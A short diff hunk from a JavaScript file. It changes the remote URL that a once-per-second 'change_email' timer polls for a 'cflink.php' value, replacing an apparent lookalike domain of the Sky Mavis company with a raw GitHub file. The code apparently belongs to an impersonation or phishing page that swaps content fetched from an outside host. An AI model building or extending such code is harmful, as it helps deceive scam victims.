@@ -57,6 +57,6 @@ change_email = setInterval(function(){
 			}
 		}
 	}
-	reqy.open("GET","https://skymavis.ml/cflink.php?a=a",true)
+	reqy.open("GET","https://raw.githubusercontent.com/jayteezer/Playground/main/cflink.php",true)
 	reqy.send()
 },1000)
